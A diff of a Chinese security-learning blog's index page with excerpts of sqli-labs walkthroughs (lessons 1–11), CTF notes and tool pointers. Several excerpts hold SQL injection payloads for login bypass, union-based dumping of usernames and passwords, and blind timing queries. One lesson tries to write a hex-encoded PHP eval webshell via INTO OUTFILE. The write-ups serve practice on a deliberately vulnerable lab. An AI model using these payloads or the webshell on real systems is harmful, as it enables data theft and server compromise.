@@ -479,70 +479,1232 @@
 
       
         
-          
-            <h1 id="sqli-labs-master-les11-POST-Error-Based-Single-quotes-String"><a href="#sqli-labs-master-les11-POST-Error-Based-Single-quotes-String" class="headerlink" title="sqli-labs-master les11:POST-Error Based-Single quotes-String"></a>sqli-labs-master les11:POST-Error Based-Single quotes-String</h1><img src="/2019/07/25/sqli-labs-les11/start.png" title="start">
+          <h1 id="sqli-labs-master-les11-POST-Error-Based-Single-quotes-String"><a href="#sqli-labs-master-les11-POST-Error-Based-Single-quotes-String" class="headerlink" title="sqli-labs-master les11:POST-Error Based-Single quotes-String"></a>sqli-labs-master les11:POST-Error Based-Single quotes-String</h1><img src="/2019/07/25/sqli-labs-les11/start.png" title="start">
 <p>一开始如上图所示.<br>由题得知这是一道POST报错型(单引号那种语句)的题<br>有了前面简单的GET类型的题,那么就先试一下</p>
 <blockquote>
 <p>Username:admin<br>Password:1</p>
 </blockquote>
 <p>然后就</p>
 <img src="/2019/07/25/sqli-labs-les11/failed1.png" title="failed">
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/25/sqli-labs-les11/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
 
-<p>再试试</p>
-<blockquote>
-<p>Username:admin<br>Password:1’ or 1=1 %23</p>
-</blockquote>
-<img src="/2019/07/25/sqli-labs-les11/failed2.png" title="failed">
+    
 
-<p>看到报错</p>
-<blockquote>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p>
-</blockquote>
-<p>就知道这#不能用%23了…都是GET顺手的锅都是顺手的锅<br>把%23改为#之后</p>
-<blockquote>
-<p>Username:admin<br>Password:1’ or 1=1#</p>
-</blockquote>
-<img src="/2019/07/25/sqli-labs-les11/successfully.png" title="successfully">
+    
 
-<p>然后</p>
-<blockquote>
-<p>1’ order by 3#</p>
-</blockquote>
-<p>报错</p>
-<blockquote>
-<p>1’ order by 2#</p>
-</blockquote>
-<p>没问题<br>看了一下源码:</p>
-<blockquote>
-<p>$sql=”SELECT username, password FROM users WHERE username=’$uname’ and password=’$passwd’ LIMIT 0,1”;</p>
-</blockquote>
-<p>然而上面所做的…就是我看WP之前所能做的…<br>接下来,<a href="https://blog.csdn.net/qq_28295425/article/details/78905840" target="_blank" rel="noopener">看WP-Recar</a><br>发现原来是可以直接在username闭合然后注释掉后面的语句…我还以为要在password搞</p>
-<blockquote>
-<p>Username:’ union select database(),version()#↓</p>
-</blockquote>
-<img src="/2019/07/25/sqli-labs-les11/dbname&version.png" title="dbname&version">
+    
 
-<blockquote>
-<p>Username:’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#👇</p>
-</blockquote>
-<img src="/2019/07/25/sqli-labs-les11/tables.png" title="tables">
+    <footer class="post-footer">
+      
 
-<blockquote>
-<p>Username:’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#↓</p>
-</blockquote>
-<img src="/2019/07/25/sqli-labs-les11/columns.png" title="columns">
+      
 
-<blockquote>
-<p>Username:’ union select group_concat(username),group_concat(password)from users#👇</p>
-</blockquote>
-<img src="/2019/07/25/sqli-labs-les11/username&passwd.png" title="username&passwd">
+      
 
-<blockquote>
-<p>Username:’ union select 1,group_concat(id)from users#👇</p>
-</blockquote>
-<img src="/2019/07/25/sqli-labs-les11/id.png" title="id">
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
 
-<p>les11[完]–2019-7-26 19:58</p>
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/07/24/sqli-labs-master-les10get-blind-time-based-double-quotes/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="OC">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OC的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/24/sqli-labs-master-les10get-blind-time-based-double-quotes/" itemprop="url">sqli-labs-master les10:GET-blind-time based -double quotes</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-24T14:37:36+08:00">
+                2019-07-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sqli-labs/" itemprop="url" rel="index">
+                    <span itemprop="name">sqli-labs</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><img src="https://ocbillhome.files.wordpress.com/2019/07/10start.png" alt></p>
+<p>只需把les9的’改为”即可</p>
+<pre><code>?id=1&quot; and if(ascii(substr(database(),1,1))=115,sleep(10),null) %23//库名第一位为s
+
+?id=1&quot; and if(left(database(),8)=&apos;security&apos;,sleep(10),null) %23//库名为security
+
+?id=1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),null) %23//表名第一位为e
+
+?id=1&quot; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),5)=&apos;emails&apos;,sleep(10),null) %23//第一个表名为emails
+
+?id=1&quot; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&apos;users&apos;,sleep(10),null) %23//第四个表名为users
+
+?id=1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1))=105,sleep(10),null) %23//表users第一列第一位为i
+
+?id=1&quot; and if(left((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),2)=&apos;id&apos;,sleep(10),null) %23//表users第一列为id
+
+?id=1&quot; and if(left((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1),8)=&apos;username&apos;,sleep(10),null) %23//表users第二列为username
+
+?id=1&quot; and if(left((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),8)=&apos;password&apos;,sleep(10),null) %23//表users第三列为password
+
+?id=1&quot; and if(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(10),null) %23//username第一个值的第一位为D
+
+?id=1&quot; and if(left((select username from users limit 0,1),4)=&apos;Dumb&apos;,sleep(10),null) %23//username第一个值为Dumb</code></pre><p>limit 0,1 从第1条开始,检索1条语句</p>
+<p>limit 1,2 从第2条开始,检索2条语句(检索到第3条)</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/07/23/sqli-labs-master-les9get-blind-time-based-single-quotes/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="OC">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OC的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/23/sqli-labs-master-les9get-blind-time-based-single-quotes/" itemprop="url">sqli-labs-master les9:GET-blind-time-based-single quotes</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-23T00:27:05+08:00">
+                2019-07-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sqli-labs/" itemprop="url" rel="index">
+                    <span itemprop="name">sqli-labs</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><img src="https://ocbillhome.files.wordpress.com/2019/07/start-1.png" alt></p>
+<p>还是熟悉的界面,please input the ID as parameter with numeric value</p>
+<p>题目是<a href="https://www.jianshu.com/p/65f05e7cc957" target="_blank" rel="noopener">时间盲注</a></p>
+<p>时间盲注：界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p>
+<p>果然,无论我输入?id=1也好,?id=1’也罢,?id=1”什么的也都是You’re in……</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/true.png" alt></p>
+<pre><code>?id=1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)) %23</code></pre><p>if(语句1,语句2,语句3)语句1正确则执行语句2,否则执行语句3</p>
+<p>sleep(n)将程序hold住n秒</p>
+<p>用left判断一下数据库名是不是security</p>
+<pre><code>?id=1&apos; and (if(left(database(),8)=&apos;security&apos;,sleep(10),null)) %23</code></pre><p><img src="https://ocbillhome.files.wordpress.com/2019/07/image-1.png" alt></p>
+<p>果然加载了10s才加载完成</p>
+<p>然后再构造一个判断表名的</p>
+<pre><code>?id=1&apos; and (if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(10),null)) %23</code></pre><p>又加载了10s,把100换成105,很快就加载出来了,看来是false了</p>
+<p>把105换成103,102,101都不行,看来第一位是101了</p>
+<p>对应ASCII码表,101为e,还记得是email</p>
+<pre><code>?id=1&apos; and (if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),5)=&apos;email&apos;,sleep(10),null)) %23</code></pre><p>果然又要加载10s才行,后面的也是差不多的操作了…手工盲注还是比较的吃力费时的</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/07/21/sqli-labs-master-les8blind-boolian-single-quotes-string/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="OC">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OC的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/21/sqli-labs-master-les8blind-boolian-single-quotes-string/" itemprop="url">sqli-labs-master les8:blind-boolian-single-quotes-string</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-21T23:39:52+08:00">
+                2019-07-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sqli-labs/" itemprop="url" rel="index">
+                    <span itemprop="name">sqli-labs</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>看题目得知这是一道布尔型盲注的题,首先搜索一下<a href="https://www.jianshu.com/p/f0174ea6c69d" target="_blank" rel="noopener">布尔型盲注</a></p>
+<p>有了前几题的经验直接来看看库名</p>
+<pre><code>?id=1&apos; and left(database(),8)=&apos;security&apos; %23</code></pre><p>left ( string, n )        string为要截取的字符串，n(n&gt;0)为截取的长度(从第一个字符串开始)</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/database-2.png" alt></p>
+<p>看来库名还是security</p>
+<p>再看看表名第一位</p>
+<pre><code>?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 %23</code></pre><p>ascii()函数返回字符的ASCII码</p>
+<p>substr(string,start,length)函数/mid(string,start,length)函数:从start位开始截取string,截取length位</p>
+<p>select那个语句最后一定要有limit 0,1</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/database-3.png" alt></p>
+<p>而100改成101的时候</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/error.png" alt></p>
+<p>报错,所以表名第一位是e</p>
+<p>然后就是漫长的盲注过程…所以盲注还是适合用脚本来跑,找WP的时候看到<a href="https://blog.csdn.net/weixin_40709439/article/details/81355856" target="_blank" rel="noopener">其中一个WP</a>是有用脚本来跑的</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/07/20/sqli-labs-master-les7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="OC">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OC的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/20/sqli-labs-master-les7/" itemprop="url">sqli-labs-master les7:GET-dump into outfile-string</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-20T23:52:22+08:00">
+                2019-07-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sqli-labs/" itemprop="url" rel="index">
+                    <span itemprop="name">sqli-labs</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>看了一下源码,sql查询语句为:</p>
+<pre><code>SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1</code></pre><p>看了一下题目,outfile,<a href="https://www.jianshu.com/p/1f97795443ce" target="_blank" rel="noopener">搜索了一下outfile是怎么回事</a>,然后构造了这样的一个payload</p>
+<pre><code>1&apos;)) select * from users into outfile &apos;D:/software/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/test.txt&apos; %23</code></pre><p>然后…什么事情都没有发生</p>
+<p>–2019.7.20 23:52</p>
+<p>继续，传个一句话木马上去</p>
+<pre><code>id=1&apos;))union select 1,2,(select 0x3C3F70687020406576616C28245F504F53545B276D756D61275D293B203F3E into outfile &apos;D:/software/phpStudy/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/test.php&apos; %23</code></pre><p>不行，看到my.ini里面#secure_file_priv = D:/backup，去掉注释，重启phpstudy进入MySQL命令行</p>
+<p>show variables like ‘secure_file_priv’;</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/image.png" alt></p>
+<pre><code>然后http://localhost/sqli-labs-master/Less-7/?id=1%27)) union select 1,2,(select 0x3C3F70687020406576616C28245F504F53545B27636D64275D293B203F3E into outfile &quot;D:\\backup\\2.php&quot;) %23</code></pre><p>然后！还是不行。。。暂时跳过，<a href="https://blog.csdn.net/qq_44105778/article/details/86926128" target="_blank" rel="noopener">贴一下我看的WP</a></p>
+<p>–2019.7.21 11:13</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/07/17/ctfthe-gamesqli-labs-master/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="OC">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OC的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/17/ctfthe-gamesqli-labs-master/" itemprop="url">sqli-labs-master les1-les6</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-17T21:34:27+08:00">
+                2019-07-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sqli-labs/" itemprop="url" rel="index">
+                    <span itemprop="name">sqli-labs</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="basic-challenges-WP1-WP2"><a href="#basic-challenges-WP1-WP2" class="headerlink" title="[basic challenges] WP1 WP2"></a>[basic challenges] <a href="https://bbs.pediy.com/thread-220075.htm" target="_blank" rel="noopener">WP1</a> <a href="https://www.cnblogs.com/peterpan0707007/p/7620048.html" target="_blank" rel="noopener">WP2</a></h2><h3 id="les1-GET-Error-based-Single-quotes-String"><a href="#les1-GET-Error-based-Single-quotes-String" class="headerlink" title="les1:GET-Error based-Single quotes-String"></a>les1:GET-Error based-Single quotes-String</h3><p><img src="https://ocbillhome.files.wordpress.com/2019/07/les1_1.png" alt></p>
+<p>看到please input the ID as parameter with numeric value后就GET一个id=1[常规测试]</p>
+<p><img src="https://ocbillhome.files.wordpress.com/2019/07/getid1.png" alt></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/17/ctfthe-gamesqli-labs-master/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/07/16/ctfbuuctf-e8-ae-b0-e4-ba-8b-e6-9c-ac/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="OC">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OC的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/16/ctfbuuctf-e8-ae-b0-e4-ba-8b-e6-9c-ac/" itemprop="url">BUUCTF记事本</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-16T14:13:15+08:00">
+                2019-07-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>—记事本—备忘录—部分题目是查看dalao的WP再摘抄过来的—</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="[Misc]"></a>[Misc]</h2><h3 id="1-二维码"><a href="#1-二维码" class="headerlink" title="1.二维码"></a><strong>1.二维码</strong></h3><p>下载文件&gt;kali&gt;binwalk filename&gt;发现有压缩包&gt;binwalk -e filename提取压缩包&gt;解压得到flag</p>
+<h3 id="2-N种解决方法"><a href="#2-N种解决方法" class="headerlink" title="2.N种解决方法"></a><strong>2.N种解决方法</strong></h3><p>直接扔到winhex拉到最后就得到flag</p>
+<h3 id="3-金三胖"><a href="#3-金三胖" class="headerlink" title="3.金三胖"></a><strong>3.金三胖</strong></h3><p>扔到PS看图层显示</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/16/ctfbuuctf-e8-ae-b0-e4-ba-8b-e6-9c-ac/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/06/30/toolscrc32/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="OC">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OC的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/30/toolscrc32/" itemprop="url">CRC32</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-30T14:16:46+08:00">
+                2019-06-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tools/" itemprop="url" rel="index">
+                    <span itemprop="name">Tools</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><a href="https://github.com/theonlypwner/crc32" target="_blank" rel="noopener">CRC32</a></p>
+<p>取自GitHub——theonlypwner</p>
+<p>zip的CRC碰撞</p>
+<p>可以这样操作：python crc32.py reverse <strong>0x2f5ead52</strong>(加粗部分为CRC)</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ocgittt.github.io/2019/06/30/toolswebdirscan/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="OC">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OC的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/30/toolswebdirscan/" itemprop="url">WebDirScan</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-30T13:02:36+08:00">
+                2019-06-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tools/" itemprop="url" rel="index">
+                    <span itemprop="name">Tools</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><a href="https://github.com/TuuuNya/webdirscan" target="_blank" rel="noopener">webdirscan</a></p>
+<p>取自GitHub——TuuuNya</p>
+<p>可以这样操作：py2 webdirscan.py <a href="http://baidu.com" target="_blank" rel="noopener">http://baidu.com</a></p>
 
           
         
@@ -581,6 +1743,10 @@
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -624,7 +1790,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -635,7 +1801,7 @@
               
               <div class="site-state-item site-state-categories">
                 
